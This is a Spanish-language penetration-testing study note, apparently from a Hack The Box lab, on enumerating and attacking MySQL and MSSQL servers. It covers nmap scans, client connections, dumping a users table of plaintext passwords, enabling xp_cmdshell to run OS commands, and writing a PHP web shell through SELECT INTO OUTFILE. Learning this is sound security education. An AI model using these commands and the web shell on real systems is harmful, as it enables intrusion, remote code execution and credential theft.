MySQL y Microsoft SQL Server ( MSSQL) son sistemas de gestión de bases de datos relacionales que almacenan datos en tablas, columnas y filas. 
Utilizan el "Structured Query Language" (SQL).
Una base de datos relacional es aquella que guarda la información de una forma estructurada en columnas y filas.

Tanto MySQL como Microsoft SQL Server (MSSQL) son Sistemas Gestores de Bases de Datos Relacionales (RDBMS).
Es decir, son programas/servicios que guardan datos en tablas y usan el lenguaje SQL para consultar o modificar esos datos.

Los hosts de bases de datos se consideran objetivos prioritarios, ya que son responsables de almacenar todo tipo de datos confidenciales, incluyendo, entre otros, credenciales de usuario, datos comerciales e información de pago. 

Además, estos servicios suelen estar configurados con usuarios con privilegios elevados. 
Si obtenemos acceso a una base de datos, podríamos aprovechar esos privilegios para realizar más acciones, como el movimiento lateral y la escalada de privilegios.

---

### Enumeración

MSSQL usa los puertos TCP/1433y UDP/1434, y MySQL usa puerto TCP/3306. 
Sin embargo, cuando MSSQL opera en modo oculto, usa el puerto TCP/2433. 
Podemos usar la opción Nmap de scripts predeterminados "-sC" para enumerar los servicios de base de datos en un sistema de destino:


```shell-session
Polika4RM@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```


---
## Mecanismos de autenticación de servidor MSSQL
MSSQL tiene una **configuración interna** (en el propio servidor) que define _cómo pueden iniciar sesión los usuarios_.  
Esa configuración tiene **dos posibles modos**:
#### 1. **Windows Authentication Mode (solo Windows)**
También llamado **“Windows only”** (solo Windows).
- El servidor _no acepta_ usuarios creados dentro de SQL Server (los “SQL logins”).
- Solo pueden conectarse usuarios que existan en **Windows** o en **Active Directory**.
  O cuantas locales del equipo (almacenadas en la SAM local) o cuentas del dominio (= Active Directory)
	- Las cuentas del equipo se representan de la siguiente forma:
		- SERVIDOR01\usuarioLocal  (o lo que es lo mismo:  .\usuarioLocal)
	- Las cuentas de Active Directory se representan con:
		- DOMINIO\usuarioAD
**Ejemplo práctico:**
- Si en el servidor existe el usuario de Windows `ACME\julio`, este usuario puede conectarse a SQL Server sin necesidad de escribir otra contraseña (porque ya está autenticado en Windows).
- Pero si intentas conectarte como `-U julio -P algo`, no funcionará, porque `julio` no existe como usuario de Windows.
Piensa en esto como “el servidor confía solo en Windows para validar quién eres”.
#### 2. **Mixed Mode Authentication (modo mixto)**
- El servidor acepta **dos tipos de usuarios**:
    1. **Usuarios de Windows / Active Directory** (`DOMINIO\usuario` o `.\usuario`)
    2. **Usuarios propios de SQL Server** (definidos dentro del motor SQL, por ejemplo `sa`, `htbdbuser`, `julio`, etc.)
       Los SQL logins se guardan dentro de la bas de datos del sistema llamada master,
- Puedes conectarte como:
	- `-U DOMINIO\\julio -P pass` (cuenta Windows)  
    o  
    - `-U julio -P pass` (cuenta SQL creada dentro del servidor).
##### Resumen visual

|Modo de autenticación del servidor|Quién puede entrar|Ejemplo de login válido|
|---|---|---|
|**Windows only**|Solo usuarios de Windows o AD|`-U DOMINIO\\usuario` o `-U .\\usuario`|
|**Mixed mode**|Usuarios de Windows **y** usuarios SQL|`-U DOMINIO\\usuario` **o** `-U usuarioSQL`|

---
#### MySQL - Connecting to the SQL Server

MySQL es un sistema gestor de bases de datos relacional (RDBMS). Es un programa (un servicio) que almacena datos en tablas, responde a consultas SQL y gestiona usuarios, permisos y transacciones.

Para conectarnos a un servidor MySQL utilizaremos:
```shell-session
Polika4RM@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

---
#### Sqlcmd - Connecting to the SQL Server

Sqlcmd es una herramienta cliente de Microsoft para conectarte a un Miscrosoft SQL Server (MSSQL)
No es el servidor, sino la herramienta con la que enviaré consultas.
Para interactuar desde una máquina Windows, ejecutaré el comando:
```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>
```

 En el caso de que querramos partir de una máquina Linux, utilizaremos "sqsh" como alternativa a "sqlcmd":
 
```shell-session
Polika4RM@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

Como alternativa, también podríamos utilizar la herramienta de Impacket llamada "mssqlclient.py":
```shell-session
Polika4RM@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

Los clientes de MSSQL determinan si quiero usar autenticación Windows o autenticación SQL según cómo escriba el usuario.
Si el usuario tiene una barra invertida \ (DOMINIO\usuario o SERVIDOR\usuario o .\usuario) el cliente interpreta que quieres usar una cuenta de Windows. Si pones solo usuario, se interpreta como login SQL.

- `DOMINIO\juan` → **cuenta de dominio** (Active Directory) → Windows Authentication.
- `SERVIDOR01\juan` o `.\juan` → **cuenta local del servidor** (el `.` significa “este equipo”) → Windows Authentication (local).
- `juan` (sin `\`) → **login SQL** interno del motor (SQL Authentication).

El servidor/cliente siguen la convención `principal\account`. 
Cuando ven la \\, interpretan que “esto no es un login SQL; es una identidad de Windows que debe validarse por el sistema operativo (Kerberos/NTLM)”.

En el siguiente ejemplo vemos como el comando usa una cuenta local del servidor Windows donde corre el SQL Server:
```shell-session
Polika4RM@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

---
### Bases de datos predeterminadas de SQL
Antes de explorar el uso de la sintaxis SQL, es fundamental conocer las bases de datos predeterminadas de MySQL y MSSQL. 

Estas bases de datos contienen información sobre la propia base de datos y nos ayudan a enumerar nombres, tablas, columnas, etc. 
Con acceso a estas bases de datos, podemos usar algunos procedimientos almacenados del sistema, pero generalmente no contienen datos de la empresa.

MySQL utiliza por defecto:
- mysql: 
	es la base de datos del sistema que contiene las tablas que almacenan la información requerida por el servidor MySQL.
- information_schema: 
	proporciona acceso a los metadatos de la base de datos.
- performance_schema: 
	es una función para supervisar la ejecución del servidor MySQL a bajo nivel.
- sys: 
	un conjunto de objetos que ayuda a los administradores de bases de datos (DBA) y desarrolladores a interpretar los datos recopilados por el esquema de rendimiento.

MSSQL utiliza por defecto:
- master: 
	almacena la información de una instancia de SQL Server.
- msdb:
	utilizado por el Agente SQL Server. Modelo: una base de datos de plantilla que se copia para cada nueva base de datos.
- resource: 
	una base de datos de solo lectura que mantiene los objetos del sistema visibles en todas las bases de datos del servidor en el esquema sys.
- Tempdb: 
	mantiene objetos temporales para consultas SQL.

---

## Sintaxi de SQL

#### 1. Mostrar bases de datos
Para bases de datos MYSQL, con el comando "SHOW DATABASES;" puedo ver las bases de datos:
```shell-session
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
```

Por otro lado, para MSSQL (microsoft SQL SERVER) puedo utilizar:
```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```

#### 2. Seleccionamos una base de Datos:

Para MYSQL:
```shell-session
mysql> USE htbusers;

Database changed
```

Para MSSQL (con sqlcmd):
```cmd-session
1> USE htbusers
2> GO

Changed database context to 'htbusers'.
```

#### 3. Mostrar tablas
Para MYSQL:
```shell-session
mysql> SHOW TABLES;

+----------------------------+
| Tables_in_htbusers         |
+----------------------------+
| actions                    |
| permissions                |
| permissions_roles          |
| permissions_users          |
| roles                      |
| roles_users                |
| settings                   |
| users                      |
+----------------------------+
8 rows in set (0.00 sec)
```

Para MSSQL (con sqlcmd):
```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles      
roles_users
settings
users 
(8 rows affected)
```

#### 4. Seleccionar todos los datos de la tabla "users"

Para MYSQL:
```shell-session
mysql> SELECT * FROM users;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

Para MSSQL (con sqlcmd):
```cmd-session
1> SELECT * FROM users
2> go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
          3 john                 john123!         2020-07-02 11:47:16.000
          4 tom                  tom123!          2020-07-02 12:23:16.000

(4 rows affected)
```

---

### EJECUTANDO COMANDOS sobre bases de datos SQL

Si sobre una base de datos se tienen los privilegios adecuados, se puede usar la base de datos SQL para ejecutar comandos del sistema o crear los elementos necesarios.

### xp_cmdshell en servidor MSSQL
**MSSQL cuenta con "xp_cmdshell".**
Esto permite ejecutar comandos del sistema operativo (cmd.exe en Windows) desde una sesión SQL.
Es decir, una consulta SQL puede llegar a pedir al servidor que ejecute por mi "whoami" o "dir C:\\"
- Esta función está desactivada por defecto. Se activa/desactiva con "sp_configure". `sp_configure` es un procedimiento almacenado del propio servidor SQL que permite ver y cambiar opciones de configuración del servidor. 
- Los comandos se ejecutan con los mismos permisos que la cuenta de servicio de SQL Server.
- Funciona de forma síncrona → la sesión SQL espera a que el comando termine antes de continuar. 

Para ejecutar comandos sobre un servidor MSSQL con sintaxi SQL, utilizaremos:
```cmd-session
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

Si "xp_cmdshell" no estuviese disponible, desde "sqlcmd" debería ejecutar:

```
1> EXEC sp_configure 'show advanced options', 1
2> GO
1> RECONFIGURE
2> GO
1> EXECUTE sp_configure 'xp_cmdshell', 1
2> GO
1> RECONFIGURE
2> GO
```

---

## Escribir Local Files
MySQL no cuenta con un procedimiento almacenado como xp_cmdshell, pero podemos ejecutar comandos si escribimos en una ubicación del sistema de archivos que pueda ejecutar nuestros comandos. 

Por ejemplo, supongamos que MySQL opera en un servidor web basado en PHP u otros lenguajes de programación como ASP.NET. 
Si tenemos los privilegios adecuados, podemos intentar escribir un archivo usando SELECT INTO OUTFILE en el directorio del servidor web. Luego, podemos buscar la ubicación del archivo y ejecutar nuestros comandos.

En el siguiente ejemplo podemos ver como podemos crear archivos maliciosos:
```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```
Cuando un navegador solicite ese archivo vía HTTP (por ejemplo `http://servidor/webshell.php?c=whoami`), el servidor web **ejecutará** el código PHP.

##### Restricciones de escritura de archivos en MySQL
En MySQL, la variable global del sistema secure_file_priv limita el efecto de las operaciones de importación y exportación de datos, como las realizadas por las sentencias LOAD DATA y SELECT … INTO OUTFILE, y la función LOAD_FILE(). Estas operaciones solo están permitidas a los usuarios con el privilegio FILE.

El "secure_file_priv" puede configurarse de la siguiente manera:

- Si está vacía, la variable no tiene efecto, lo cual no constituye una configuración segura.
- Si se configura con el nombre de un directorio, el servidor limita las operaciones de importación y exportación para que solo funcionen con los archivos de ese directorio. El directorio debe existir; el servidor no lo crea.
- Si se configura con NULL, el servidor deshabilita las operaciones de importación y exportación.

